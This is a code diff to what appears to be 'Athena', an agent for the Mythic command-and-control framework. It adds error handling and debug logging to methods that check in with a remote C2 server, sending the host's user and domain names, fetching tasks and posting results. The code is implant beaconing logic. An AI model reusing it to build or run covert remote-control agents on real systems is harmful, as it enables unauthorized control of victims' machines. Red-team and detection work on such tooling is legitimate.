@@ -51,8 +51,15 @@ namespace Athena
                 domain = Environment.UserDomainName,
             };
             var responseString = SendPOST(this.MythicConfig.postURL, ct).Result;
-            CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
-            return cs;
+            try
+            {
+                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
+                return cs;
+            }
+            catch
+            {
+                return new CheckinResponse();
+            }
         }
 
         public List<MythicTask> GetTasks()
@@ -63,9 +70,18 @@ namespace Athena
                 tasking_size = -1,
 
             };
-            var responseString = SendPOST(this.MythicConfig.postURL, gt).Result;
-            GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(Misc.Base64Decode(responseString).Substring(36));
-            return gtr.tasks;
+            try
+            {
+
+                var responseString = SendPOST(this.MythicConfig.postURL, gt).Result;
+                Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
+                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(Misc.Base64Decode(responseString).Substring(36));
+                return gtr.tasks;
+            }
+            catch
+            {
+                return null;
+            }
         }
 
         public bool PostResponse(Dictionary<string,MythicJob> jobs)
@@ -118,8 +134,9 @@ namespace Athena
             try
             {
                 var responseString = SendPOST(this.MythicConfig.postURL, prr).Result;
-                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
-                if (cs.status != "success")
+                Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
+                PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString).Substring(36));
+                if (cs.responses.Count < 1 || cs.responses[0].status != "success")
                 {
                     return false;
                 }
@@ -133,15 +150,30 @@ namespace Athena
         }
         private async Task<string> SendGET(string url)
         {
-            var response = await Globals.client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
-            return await response.Content.ReadAsStringAsync();
+            try
+            {
+                var response = await Globals.client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
+                return await response.Content.ReadAsStringAsync();
+            }
+            catch
+            {
+                return "";
+            }
         }
         private async Task<string> SendPOST(string url, object obj)
         {
-            string json = JsonConvert.SerializeObject(obj);
-            var content = new StringContent(Misc.Base64Encode(this.MythicConfig.uuid + json));
-            var response = await Globals.client.PostAsync(url, content);
-            return await response.Content.ReadAsStringAsync();
+            try
+            {
+                string json = JsonConvert.SerializeObject(obj);
+                Console.WriteLine("Request: " + json);
+                var content = new StringContent(Misc.Base64Encode(this.MythicConfig.uuid + json));
+                var response = await Globals.client.PostAsync(url, content);
+                return await response.Content.ReadAsStringAsync();
+            }
+            catch
+            {
+                return "";
+            }
         }
     }
 }
